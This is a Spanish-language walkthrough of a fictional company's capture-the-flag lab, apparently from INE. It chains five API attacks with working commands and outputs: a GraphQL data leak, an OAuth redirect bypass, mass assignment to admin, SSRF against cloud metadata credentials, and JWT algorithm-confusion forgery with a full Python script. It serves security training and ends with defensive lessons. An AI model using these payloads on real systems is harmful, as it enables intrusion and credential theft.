@@ -1,0 +1,331 @@
+
+
+
+# NexaCorp — Writeup Completo
+
+**Plataforma:** INE
+**Dificultad:** Media-Alta
+**Categoria:** Red Teaming / API Security
+**Puntos:** 2250 pts (450 x 5 flags)
+
+---
+
+## Que es este lab?
+
+NexaCorp es una empresa ficticia con una aplicacion web moderna en produccion. El punto de partida es **solo una URL**: `nexacorp.ine.local`. Sin credenciales, sin documentacion, sin pistas.
+
+El objetivo es encadenar **5 vulnerabilidades reales** para comprometer el sistema desde cero, igual que lo haria un atacante real en una empresa.
+
+---
+
+## Conceptos previos (para beginners)
+
+**SPA (Single Page Application):** Una web que carga todo su codigo JavaScript de una vez. React, Vue y Angular son ejemplos. El problema de seguridad es que el codigo JS es publico, cualquiera puede leerlo y encontrar rutas, tokens o logica interna.
+
+**API REST:** Un servidor que responde a peticiones HTTP con datos en JSON. Los verbos principales son GET (leer), POST (crear), PUT (modificar), DELETE (borrar).
+
+**JWT (JSON Web Token):** Un token de autenticacion con tres partes separadas por puntos: `header.payload.signature`. El header dice que algoritmo se usa, el payload contiene los datos del usuario, y la firma verifica que no fue manipulado.
+
+**OAuth 2.0:** Un protocolo de autenticacion delegada. En vez de dar tu contrasena directamente, obtienes un codigo temporal que luego cambias por un token de acceso.
+
+**SSRF (Server-Side Request Forgery):** Haces que el servidor haga una peticion HTTP en tu nombre. Util para acceder a recursos internos que tu no puedes alcanzar directamente.
+
+---
+
+## Reconocimiento inicial
+
+### Verificar conectividad
+
+```bash
+ping nexacorp.ine.local
+
+cat /etc/hosts
+# 10.2.27.239    nexacorp.ine.local
+````
+
+### Escaneo de puertos con Nmap
+
+```bash
+nmap -p- --open --min-rate 5000 -A -sS -Pn -n 10.2.27.239 -oN nmap
+```
+
+**Explicacion de los flags:**
+
+- `-p-` escanear los 65535 puertos
+- `--open` mostrar solo los puertos abiertos
+- `--min-rate 5000` enviar minimo 5000 paquetes por segundo
+- `-A` deteccion de SO, versiones y scripts
+- `-sS` SYN scan, sigiloso, no completa la conexion TCP
+- `-Pn` no hacer ping previo
+- `-n` no resolver DNS
+- `-oN nmap` guardar output en archivo
+
+![[Pasted image 20260505232338.png]]
+
+|Puerto|Servicio|Notas|
+|---|---|---|
+|22|SSH OpenSSH 9.6p1|Acceso remoto por terminal|
+|1337|nginx 1.29.8|Portal web principal|
+|3389|xrdp|Escritorio remoto Linux|
+|8090|Node.js Express|API backend|
+
+---
+
+## FLAG 1 - GraphQL expuesto en bundle JS
+
+**Vulnerabilidad:** Information Disclosure / GraphQL sin autenticacion **Flag:** `r3c0n_js_bund13_gr4phql_l34k`
+
+### Exploracion del portal web
+
+```bash
+curl -s http://nexacorp.ine.local:1337/ > web1337.txt
+cat web1337.txt
+```
+
+![[Pasted image 20260505233705.png]]
+
+Es una SPA de React. Todo el codigo esta en un bundle JS:
+
+```bash
+curl -s http://nexacorp.ine.local:1337/assets/app.bundle.js -o appbundle.js
+```
+
+### Analisis del bundle JS
+
+El archivo esta minificado. Usamos grep con contexto para extraer informacion util:
+
+```bash
+grep -oP '.{0,50}recon.{0,50}' appbundle.js
+grep -oP '.{0,50}token.{0,50}' appbundle.js
+grep -oP '.{0,50}secret.{0,50}' appbundle.js
+grep -oP 'http[^"]+' appbundle.js
+```
+
+![[Pasted image 20260505234600.png]]
+
+![[Pasted image 20260505235520.png]]
+
+**Hallazgos criticos:**
+
+1. El recon_token esta en el endpoint GraphQL debugInfo
+2. OAuth usa `client_id:"nexacorp-prod"`
+3. Endpoint `/api/vault/critical-secrets` requiere JWT especial
+4. URL de metadata AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/nexacorp-prod-role`
+
+### Obtener el recon_token
+
+```bash
+curl -s -X POST http://nexacorp.ine.local:1337/api/graphql -H "Content-Type: application/json" -d "{\"query\":\"{debugInfo{recon_token flag}}\"}"
+```
+
+**Respuesta:**
+
+```json
+{
+  "data": {
+    "debugInfo": {
+      "recon_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
+      "flag": "FLAG{r3c0n_js_bund13_gr4phql_l34k}"
+    }
+  }
+}
+```
+
+**Por que es vulnerable?** El endpoint GraphQL esta publico sin autenticacion y expone informacion sensible. El bundle JS revela su existencia, algo que nunca deberia estar en codigo cliente.
+
+---
+
+## FLAG 2 - OAuth redirect_uri bypass
+
+**Vulnerabilidad:** OAuth 2.0 open redirect con validacion startsWith **Flag:** `04uth_r3d1r3ct_ur1_byp4ss`
+
+### El flujo OAuth
+
+```
+1. Cliente al Servidor: recon_token
+2. Servidor al Cliente: authorization_code
+3. Cliente al Servidor: code a cambio de access_token
+4. Servidor al Cliente: JWT de acceso
+```
+
+```bash
+curl -s "http://nexacorp.ine.local:1337/oauth/authorize?client_id=nexacorp-prod&redirect_uri=https://app.nexacorp.io/callback&response_type=code&scope=openid+profile&recon_token=<RECON_TOKEN>"
+```
+
+![[Pasted image 20260506000147.png]]
+
+Obtenemos el code y lo cambiamos por access_token:
+
+```bash
+curl -s -X POST http://nexacorp.ine.local:1337/oauth/token -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=authorization_code&code=2fff8592b2e14ba6ac5ec4c48dc998f1&redirect_uri=https://app.nexacorp.io/callback&client_id=nexacorp-prod"
+```
+
+**Por que es vulnerable?** El servidor valida la redirect_uri con `startsWith()`. Esto permite URIs como `https://app.nexacorp.io/callback.evil.com` que empiezan igual pero redirigen a un dominio malicioso donde un atacante capturaria el codigo.
+
+---
+
+## FLAG 3 - Mass Assignment
+
+**Vulnerabilidad:** OWASP API3:2023, Mass Assignment / BOPLA **Flag:** `m4ss_4ss1gn_pr1v_3sc4l4t10n`
+
+### Perfil actual
+
+```bash
+curl -s http://nexacorp.ine.local:8090/api/v2/users/me -H "Authorization: Bearer <TOKEN>"
+# Respuesta: role: "employee"
+```
+
+### El ataque
+
+Mass Assignment ocurre cuando el servidor acepta cualquier campo del JSON sin filtrar cuales estan permitidos. Intentamos cambiar nuestro propio rol:
+
+```bash
+curl -s -X PUT http://nexacorp.ine.local:8090/api/v2/users/me -H "Authorization: Bearer <TOKEN>" -H "Content-Type: application/json" -d "{\"role\":\"admin\"}"
+```
+
+**Respuesta:**
+
+```json
+{
+  "success": true,
+  "user": {"role": "admin"},
+  "flag": "FLAG{m4ss_4ss1gn_pr1v_3sc4l4t10n}"
+}
+```
+
+**Por que es vulnerable?** No existe allowlist de campos modificables. El servidor escribe directamente en la base de datos lo que recibe, incluyendo campos criticos como `role`.
+
+---
+
+## FLAG 4 - SSRF via PDF renderer
+
+**Vulnerabilidad:** Server-Side Request Forgery en generador de PDFs **Flag:** `bl1nd_ssrf_pdf_r3nd3r_3xf1l`
+
+### El concepto SSRF
+
+SSRF ocurre cuando consigues que el servidor haga una peticion HTTP por ti. La IP `169.254.169.254` es la metadata de AWS EC2, solo accesible desde dentro de la VM. Nosotros no podemos acceder, pero el servidor si.
+
+El endpoint `/api/v2/reports/generate` renderiza HTML como PDF con wkhtmltopdf/Chromium, que funciona como un navegador real y carga URLs.
+
+### El ataque
+
+Inyectamos un iframe apuntando a la metadata de AWS:
+
+```bash
+curl -s -X POST http://nexacorp.ine.local:8090/api/v2/reports/generate -H "Authorization: Bearer <TOKEN>" -H "Content-Type: application/json" -d "{\"template\":\"<html><body><iframe src='http://169.254.169.254/latest/meta-data/iam/security-credentials/nexacorp-prod-role'></iframe></body></html>\"}"
+```
+
+**Resultado:**
+
+```json
+{
+  "AccessKeyId": "ASIAXNEXACORP2024PROD",
+  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYNEXACORP",
+  "Flag": "FLAG{bl1nd_ssrf_pdf_r3nd3r_3xf1l}"
+}
+```
+
+---
+
+## FLAG 5 - JWT Algorithm Confusion
+
+**Vulnerabilidad:** JWT Algorithm Confusion RS256 a HS256 **Flag:** `jwt_4lg0_c0nfus10n_rs2hs`
+
+### El concepto
+
+- **RS256:** firma con clave privada (secreta), verifica con clave publica (conocida)
+- **HS256:** firma y verifica con el mismo secreto compartido
+
+Si el servidor lee el campo `alg` del JWT para decidir que algoritmo usar, podemos cambiarlo de RS256 a HS256. El servidor entonces usara la clave publica RSA como secreto HMAC. Y nosotros tenemos esa clave publica.
+
+### Paso 1: Obtener la clave publica
+
+```bash
+curl -s http://nexacorp.ine.local:1337/.well-known/jwks.json
+echo "<valor_x5c>" | base64 -d > pubkey.pem
+```
+
+### Paso 2: Forjar JWT con Python
+
+```bash
+cat > forge.py << 'PYEOF'
+import hmac, hashlib, base64, json
+
+def b64url(data):
+    if isinstance(data, str):
+        data = data.encode()
+    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
+
+header = b64url(json.dumps({'alg':'HS256','typ':'JWT'}))
+payload = b64url(json.dumps({
+    'sub': '1003',
+    'iss': 'https://auth.nexacorp.io',
+    'aud': 'nexacorp-prod',
+    'role': 'super-admin',
+    'iat': 1778018631,
+    'exp': 9999999999
+}))
+
+with open('pubkey.pem', 'rb') as f:
+    secret = f.read()
+
+msg = (header + '.' + payload).encode()
+sig = hmac.new(secret, msg, hashlib.sha256).digest()
+print(header + '.' + payload + '.' + b64url(sig))
+PYEOF
+
+python3 forge.py
+```
+
+### Paso 3: Acceder al vault
+
+```bash
+curl -s http://nexacorp.ine.local:8090/api/vault/critical-secrets -H "Authorization: Bearer <TOKEN_FORJADO>"
+```
+
+**Respuesta:**
+
+```json
+{
+  "vault_access": "GRANTED",
+  "critical_secrets": {
+    "database_master": "postgresql://vault_admin:Nxa$up3r$ecr3t2024@db.nexacorp.local:5432/prod",
+    "flag": "FLAG{jwt_4lg0_c0nfus10n_rs2hs}"
+  }
+}
+```
+
+---
+
+## Cadena de ataque completa
+
+```
+Bundle JS publico -> GraphQL expuesto -> recon_token    [FLAG 1]
+        |
+OAuth authorize -> redirect_uri bypass -> access_token  [FLAG 2]
+        |
+PUT /users/me -> Mass Assignment -> rol admin           [FLAG 3]
+        |
+PDF renderer -> SSRF -> metadata AWS + clave publica    [FLAG 4]
+        |
+JWT HS256 forjado con clave publica -> vault            [FLAG 5]
+```
+
+## Tabla de flags
+
+|#|Titulo|Vulnerabilidad|Flag|
+|---|---|---|---|
+|1|Something was left exposed|GraphQL debugInfo publico|`r3c0n_js_bund13_gr4phql_l34k`|
+|2|A credential meant for someone else|OAuth redirect_uri bypass|`04uth_r3d1r3ct_ur1_byp4ss`|
+|3|You gave yourself access|Mass Assignment / BOPLA|`m4ss_4ss1gn_pr1v_3sc4l4t10n`|
+|4|The server fetches something internal|SSRF via PDF renderer|`bl1nd_ssrf_pdf_r3nd3r_3xf1l`|
+|5|You walk through a door using an identity you forged|JWT Algorithm Confusion|`jwt_4lg0_c0nfus10n_rs2hs`|
+
+## Lecciones aprendidas
+
+1. Nunca exponer endpoints internos en codigo cliente. El bundle JS revelo rutas, tokens y la URL de metadata AWS.
+2. Validar redirect_uri con igualdad exacta, nunca con startsWith.
+3. Usar allowlist de campos en endpoints PUT/PATCH para evitar Mass Assignment.
+4. Los renderizadores de PDF son navegadores. Sanitizar URLs en templates de usuario.
+5. No confiar en el header alg del JWT. El algoritmo debe estar fijado en el servidor.
+
